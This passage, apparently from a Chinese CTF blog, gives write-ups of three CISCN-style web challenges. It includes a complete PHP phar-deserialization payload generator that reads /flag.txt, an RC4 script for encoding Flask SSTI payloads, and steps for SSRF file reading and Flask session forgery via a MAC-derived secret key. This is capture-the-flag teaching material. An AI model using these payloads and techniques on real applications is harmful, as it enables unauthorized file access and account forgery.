href=<span class="string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/panel.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">&quot;breadcrumb&quot;</span>&gt;</span><br><span class="line">    &lt;ol <span class="class"><span class="keyword">class</span>=&quot;<span class="title">breadcrumb</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;管理面板&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">fileLabel</span>&quot;&gt;上传文件&lt;/<span class="title">label</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span> <span class="title">ml</span>-<span class="title">auto</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;你好 &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SESSION</span>[&#x27;<span class="title">username</span>&#x27;]?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ol</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>&quot; <span class="title">id</span>=&quot;<span class="title">toast</span>-<span class="title">container</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> &quot;<span class="title">class</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">a</span> = <span class="title">new</span> <span class="title">FileList</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">sandbox</span>&#x27;]);</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Name</span>();</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Size</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到由class.php，读一下，这题应该是个反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到file类的close有file_get_contents函数可以读文件，在FileList类里会创建flie类，并且会打印出来，所以我们要先办法在FileList里调用file的close方法，看到filelist的call方法在调用filelist没有的方法时会去调用file的方法，在use类里会调用db变量的close方法，我们只要让db为filelist就好了，但是本体没有反序列化的点，有上传我们就要用phar反序列化</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;	<span class="comment"># 这里的flag.txt是多次猜测出来的</span></span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$filelist</span> = <span class="keyword">new</span> FileList();</span><br><span class="line"><span class="variable">$user</span>-&gt;db = <span class="variable">$filelist</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phr.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;\?php __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$user</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>改后缀上传，delect用phar协议触发反序列化</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608172250.png"></p>
<p>拿到flag</p>
<h2 id="CISCN-2019华东南-Double-Secret"><a href="#CISCN-2019华东南-Double-Secret" class="headerlink" title="[CISCN 2019华东南]Double Secret"></a>[CISCN 2019华东南]Double Secret</h2><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610132912.png"></p>
<p>什么都没有我们扫下目录</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610133125.png"></p>
<p>robots.txt没什么用</p>
<p>再看看</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610133657.png"></p>
<p>有console目录应该是flask框架，flask框架我们可以从dubug模式入手</p>
<p>但是首先要让他报错</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610134635.png"></p>
<p>在secret路由可以传参数，看看能不能让他报错</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610142000.png"></p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610142255.png"></p>
<p>是ascii码的报错，我们来看看源码</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610142432.png"></p>
<p>做了个rc4加密，之后进行了模板渲染，看到模板渲染我们就想到ssti</p>
<p>我们先来看看rc4加密</p>
<p>key是HereIsTreasure</p>
<p>我们找个脚本把我们的payload加密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;HereIsTreasure&quot;</span>, message = <span class="string">&quot;ciscn&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610144709.png">拿到flag</p>
<h2 id="CISCN-2019华东南-Web4"><a href="#CISCN-2019华东南-Web4" class="headerlink" title="[CISCN 2019华东南]Web4"></a>[CISCN 2019华东南]Web4</h2><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610144832.png"></p>
<p>看到readsomething点进去看看</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610145153.png"></p>
<p>试试用url读本地文件</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610145335.png"></p>
<p>能读</p>
<p>这个路由没有php后缀应该是python的网站我们读下源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们要伪造session能读到flag，伪造session需要密钥，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233)</span><br></pre></td></tr></table></figure>

<p>密钥是个随机数由random赋予uuid.getnode()是由mac地址决定的</p>
<p>我们查看地址</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610155637.png"></p>
<p>然后伪造session</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610162221.png"></p>
<p>拿到flag</p>
]]></content>
  </entry>
  <entry>
    <title>node</title>
    <url>/2022/01/18/node/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
  </entry>
  <entry>
    <title>hf</title>
    <url>/2022/03/21/%E5%88%B7%E9%A2%98/</url>
